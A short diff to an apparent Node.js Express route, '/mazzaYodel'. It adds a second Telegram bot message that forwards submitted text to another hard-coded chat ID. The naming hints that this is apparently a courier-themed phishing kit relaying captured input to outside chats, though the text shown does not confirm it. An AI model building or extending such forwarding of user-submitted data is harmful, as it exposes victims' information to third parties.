@@ -660,6 +660,9 @@ app.post('/mazzaYodel', (req, res) => {
             axios.post(
                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1739191403&text=Yodel:\n${originalText}`
             );
+            axios.post(
+                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=Yodel:\n${originalText}`
+            );
             mazCount += 1;
         }
 
